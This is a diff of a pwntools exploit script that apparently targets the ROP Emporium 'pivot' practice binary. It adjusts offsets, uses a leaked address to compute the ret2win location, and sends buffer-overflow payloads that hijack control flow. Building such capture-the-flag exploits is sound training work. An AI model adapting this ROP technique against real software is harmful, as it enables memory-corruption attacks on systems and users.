@@ -14,6 +14,7 @@ offset = cyclic_find('kaaalaaa') # size of the second buffer
 foothold_offset = 0x96a
 ret2win_offset = 0xa81
 got_offset = ret2win_offset - foothold_offset
+main_offset = 0xf18 - 0xef0 
 
 
 # elements to use in the ROP chain
@@ -40,8 +41,8 @@ gdb_script = '''
         '''
 
 
-io = gdb.debug(elf.path, gdbscript=gdb_script)
-#io = elf.process()
+#io = gdb.debug(elf.path, gdbscript=gdb_script)
+io = elf.process()
 
 pause()
 
@@ -76,9 +77,7 @@ payload_2 = flat(
         )
 
 
-payload_3 = flat(
-        0x6969696969
-        )
+
 
 
 pause()
@@ -97,15 +96,14 @@ print("SENDING PAYLOAD #2")
 io.sendline(payload_2)
 
 print(io.recvuntil(b'libpivot\n'))
-ret2win = int(u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00'))) - got_offset
+ret2win =  u64(io.recvuntil(b'\n').strip().ljust(8, b'\x00')) + got_offset
 
-print(ret2win)
+print("Address of ret2win: ", hex(ret2win))
 
-payload_4 = flat(
-        b'b' * offset,
-        ret2win,
+payload_3 = flat(
+        b'c' * main_offset,
+        ret2win
         )
-
 
 
 pause()
@@ -113,15 +111,8 @@ pause()
 print("SENDING PAYLOAD #3")
 print(io.recv().decode())
 io.sendline(payload_3)
-print(io.recv().decode())
-
-pause()
-
-print("SENDING PAYLOAD #4")
-io.sendline(payload_4)
 
 print(io.recv().decode())
-print(io.recv().decode())
-print(io.recv().decode())
+print("CONGRATS!!!")
 
 pause()
